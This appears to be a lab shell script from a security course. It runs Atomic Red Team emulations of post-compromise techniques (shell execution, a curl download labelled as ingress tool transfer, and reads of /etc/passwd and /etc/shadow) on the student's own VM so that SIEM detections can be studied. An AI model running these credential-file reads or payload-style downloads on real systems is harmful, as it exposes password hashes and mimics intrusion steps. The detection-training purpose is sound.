#!/usr/bin/env bash
# Week 9 - Atomic Red Team tests, run on the lab Kali VM and captured in Elastic SIEM.
# These emulate the POST-COMPROMISE actions of an attacker who already has a foothold
# on the victim machine through the phishing chain studied in Weeks 6-7
# (T1566.002 Spearphishing Link -> T1204.001 Malicious Link -> foothold).
#
# Everything runs against our OWN lab VM. No real credentials are stolen and no real
# system is attacked. Telemetry is collected by Auditbeat (auditd module).
set -u

echo "=== T1059.004  Unix Shell (Execution) ==="
# Create and run a small shell script, as an attacker would run commands after compromise.
sh -c "echo 'echo Hello from Atomic Red Team' > /tmp/T1059.004.sh; chmod +x /tmp/T1059.004.sh; /tmp/T1059.004.sh"

echo "=== T1105  Ingress Tool Transfer (Command and Control) ==="
# Download a file with curl, standing in for an attacker pulling a tool/payload onto the host.
curl -fsSL "https://example.com/" -o /tmp/T1105_payload.bin
ls -l /tmp/T1105_payload.bin

echo "=== T1003.008  OS Credential Dumping: /etc/passwd and /etc/shadow (Credential Access) ==="
cat /etc/passwd | tail -3
sudo cat /etc/shadow | tail -3

date -u +"Finished at %Y-%m-%d %H:%M:%S UTC"
echo "Now search the events in Kibana (data view: auditbeat). See README.md for the queries."
